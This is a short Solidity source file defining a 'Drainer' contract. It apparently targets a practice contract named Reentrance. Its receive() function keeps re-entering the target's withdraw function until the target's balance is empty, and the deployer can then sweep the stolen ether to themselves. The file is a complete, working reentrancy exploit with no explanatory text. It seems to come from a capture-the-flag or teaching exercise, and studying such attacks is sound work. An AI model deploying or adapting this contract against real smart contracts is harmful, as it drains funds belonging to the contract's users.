// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./Reentrance.sol";

contract Drainer {
    Reentrance public reentranceContract;
    address public owner;
    address public _reentranceAddress;
    uint public amount = 500000000000000;

    constructor (address payable reentranceAddress) {
        owner = msg.sender;
        reentranceContract = Reentrance(reentranceAddress);
        _reentranceAddress = reentranceAddress;
    }  

    function drainIt() public {
        reentranceContract.withdraw(amount);
    }

    function checkBalance() public view returns (uint){
        return address(_reentranceAddress).balance;
    }

    function withdraw() public {
        require(msg.sender == owner, "No can do!");
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Failed to withdraw");
    }

    receive () external payable {
        while (checkBalance() > 0) 
            drainIt();
    }
}